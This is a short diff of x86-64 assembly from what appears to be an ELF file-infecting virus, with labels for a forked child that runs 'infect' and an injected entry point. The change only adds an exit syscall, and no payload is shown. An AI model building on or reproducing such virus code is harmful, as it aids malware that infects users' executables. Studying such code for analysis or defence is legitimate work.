@@ -52,6 +52,10 @@ _fork:; child -> run infect
 		mov rdi, 1
 		syscall
 %endif
+	mov rax, 60; exit
+	mov rdi, 0
+	syscall
+
 	sub rsi, 0x5; sub call instr
 
 	sub rsi, [rel entry_inject]
